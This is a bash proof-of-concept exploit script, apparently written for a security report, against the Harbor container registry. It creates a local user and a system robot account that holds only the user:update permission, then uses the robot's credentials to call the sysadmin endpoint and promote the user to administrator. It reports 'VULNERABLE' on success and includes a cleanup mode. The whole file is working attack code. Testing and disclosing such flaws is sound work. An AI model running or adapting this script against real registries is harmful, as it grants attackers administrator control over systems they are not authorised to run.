#!/usr/bin/env bash
set -euo pipefail

# PoC for #45:
# 1. Create a normal local user.
# 2. Create a system robot with only /system/user:update.
# 3. Use the robot to promote the normal user to sysadmin.
#
# By default this LEAVES the created user and robot in Harbor for inspection.
# Run with "delete" to clean artifacts recorded in the state file:
#   ./security-pocs/poc-45-robot-userupdate-sysadmin.sh delete
#
# Requires db_auth for local user creation. On oidc_auth/ldap_auth/http_auth,
# Harbor rejects POST /users by design.

HARBOR_URL="${HARBOR_URL:-http://127.0.0.1:8080}"
ADMIN_USER="${ADMIN_USER:-admin}"
ADMIN_PASS="${ADMIN_PASS:-Harbor12345}"
POC_STATE="${POC_STATE:-$(dirname "$0")/.poc-45-state.env}"
STAMP="${POC_TAG:-$(date +%s)}"
POC_USER="${POC_USER:-sectest45-user-$STAMP}"
POC_USER_PASS="${POC_USER_PASS:-Sectest45Pass1}"
POC_ROBOT="${POC_ROBOT:-sectest45-userupdate-$STAMP}"

need() {
  command -v "$1" >/dev/null || {
    echo "missing dependency: $1" >&2
    exit 1
  }
}

need curl
need jq

api_admin() {
  curl -ksS -u "$ADMIN_USER:$ADMIN_PASS" "$@"
}

api_robot() {
  curl -ksS -u "$ROBOT_NAME:$ROBOT_SECRET" "$@"
}

load_state() {
  if [[ ! -f "$POC_STATE" ]]; then
    echo "state file not found: $POC_STATE" >&2
    echo "Run exploit first, or set POC_STATE to correct file." >&2
    exit 1
  fi
  # shellcheck disable=SC1090
  source "$POC_STATE"
}

cleanup_artifacts() {
  load_state

  echo "cleanup from state: $POC_STATE"
  echo "user: ${USER_ID:-} ${USERNAME:-}"
  echo "robot: ${ROBOT_ID:-} ${ROBOT_NAME:-}"

  if [[ -n "${USER_ID:-}" ]]; then
    echo "demoting user before delete, in case delete fails"
    api_admin -o /dev/null -w "%{http_code}" \
      -X PUT "$HARBOR_URL/api/v2.0/users/$USER_ID/sysadmin" \
      -H 'Content-Type: application/json' \
      -d '{"sysadmin_flag":false}' || true
    echo
  fi

  if [[ -n "${ROBOT_ID:-}" ]]; then
    code="$(api_admin -o /tmp/poc45-del-robot.$$ -w "%{http_code}" \
      -X DELETE "$HARBOR_URL/api/v2.0/robots/$ROBOT_ID" || true)"
    echo "delete robot $ROBOT_ID -> HTTP $code"
    rm -f /tmp/poc45-del-robot.$$
  fi

  if [[ -n "${USER_ID:-}" ]]; then
    code="$(api_admin -o /tmp/poc45-del-user.$$ -w "%{http_code}" \
      -X DELETE "$HARBOR_URL/api/v2.0/users/$USER_ID" || true)"
    echo "delete user $USER_ID -> HTTP $code"
    rm -f /tmp/poc45-del-user.$$
  fi

  rm -f "$POC_STATE"
  echo "state removed"
}

if [[ "${1:-}" == "delete" ]]; then
  cleanup_artifacts
  exit 0
fi

auth_mode="$(
  api_admin "$HARBOR_URL/api/v2.0/configurations" |
    jq -r 'if (.auth_mode | type) == "object" then .auth_mode.value else (.auth_mode // empty) end'
)"
if [[ "$auth_mode" != "db_auth" && "$auth_mode" != "database" && -n "$auth_mode" ]]; then
  echo "Harbor auth_mode is '$auth_mode'; local user creation requires db_auth." >&2
  echo "Use a db_auth dev instance, or adapt script to target an existing non-admin user id." >&2
  exit 1
fi

echo "creating normal user: $POC_USER"
user_headers="$(mktemp)"
user_body="$(mktemp)"
user_code="$(
  api_admin -D "$user_headers" -o "$user_body" -w "%{http_code}" \
    -X POST "$HARBOR_URL/api/v2.0/users" \
    -H 'Content-Type: application/json' \
    -d @- <<JSON
{
  "username": "$POC_USER",
  "password": "$POC_USER_PASS",
  "email": "$POC_USER@example.invalid",
  "realname": "Sectest 45 Normal User",
  "comment": "created by poc-45"
}
JSON
)"

if [[ "$user_code" != "201" ]]; then
  echo "create user failed -> HTTP $user_code" >&2
  cat "$user_body" >&2
  rm -f "$user_headers" "$user_body"
  exit 1
fi

USER_ID="$(awk -F/ 'tolower($1)=="location:" {gsub("\r","",$NF); print $NF}' "$user_headers" | tail -1)"
rm -f "$user_headers" "$user_body"
if [[ -z "$USER_ID" ]]; then
  # Fallback when Location missing: list by username.
  USER_ID="$(api_admin "$HARBOR_URL/api/v2.0/users?username=$POC_USER" | jq -r '.[0].user_id // .[0].user_id')"
fi
echo "created user id=$USER_ID"

echo "creating system robot with only /system/user:update: $POC_ROBOT"
robot_json="$(
  api_admin -X POST "$HARBOR_URL/api/v2.0/robots" \
    -H 'Content-Type: application/json' \
    -d @- <<JSON
{
  "name": "$POC_ROBOT",
  "level": "system",
  "duration": 1,
  "disable": false,
  "permissions": [{
    "kind": "system",
    "namespace": "/",
    "access": [{
      "resource": "user",
      "action": "update",
      "effect": "allow"
    }]
  }]
}
JSON
)"

ROBOT_ID="$(jq -r '.id' <<<"$robot_json")"
ROBOT_NAME="$(jq -r '.name' <<<"$robot_json")"
ROBOT_SECRET="$(jq -r '.secret' <<<"$robot_json")"

if [[ -z "$ROBOT_ID" || "$ROBOT_ID" == "null" || -z "$ROBOT_SECRET" || "$ROBOT_SECRET" == "null" ]]; then
  echo "create robot failed:" >&2
  echo "$robot_json" >&2
  exit 1
fi
echo "created robot id=$ROBOT_ID name=$ROBOT_NAME"

cat >"$POC_STATE" <<EOF
HARBOR_URL=${HARBOR_URL@Q}
USERNAME=${POC_USER@Q}
USER_ID=${USER_ID@Q}
ROBOT_NAME=${ROBOT_NAME@Q}
ROBOT_ID=${ROBOT_ID@Q}
EOF

echo "before exploit:"
api_admin "$HARBOR_URL/api/v2.0/users/$USER_ID" | jq '{user_id,username,sysadmin_flag}'

echo "exploit: robot calls PUT /api/v2.0/users/$USER_ID/sysadmin"
resp_body="$(mktemp)"
exploit_code="$(
  api_robot -o "$resp_body" -w "%{http_code}" \
    -X PUT "$HARBOR_URL/api/v2.0/users/$USER_ID/sysadmin" \
    -H 'Content-Type: application/json' \
    -d '{"sysadmin_flag":true}'
)"
echo "robot sysadmin toggle -> HTTP $exploit_code"
cat "$resp_body"
echo
rm -f "$resp_body"

echo "after exploit:"
after="$(api_admin "$HARBOR_URL/api/v2.0/users/$USER_ID")"
echo "$after" | jq '{user_id,username,sysadmin_flag}'

sysadmin_flag="$(jq -r '.sysadmin_flag' <<<"$after")"
if [[ "$exploit_code" == "200" && "$sysadmin_flag" == "true" ]]; then
  echo "VULNERABLE: non-sysadmin robot with only user:update promoted normal user to sysadmin."
  echo "Artifacts intentionally left:"
  echo "  user:  $POC_USER id=$USER_ID password=$POC_USER_PASS"
  echo "  robot: $ROBOT_NAME id=$ROBOT_ID"
  echo "State: $POC_STATE"
  echo "Cleanup: $0 delete"
else
  echo "NOT CONFIRMED: expected HTTP 200 and sysadmin_flag=true." >&2
  exit 2
fi
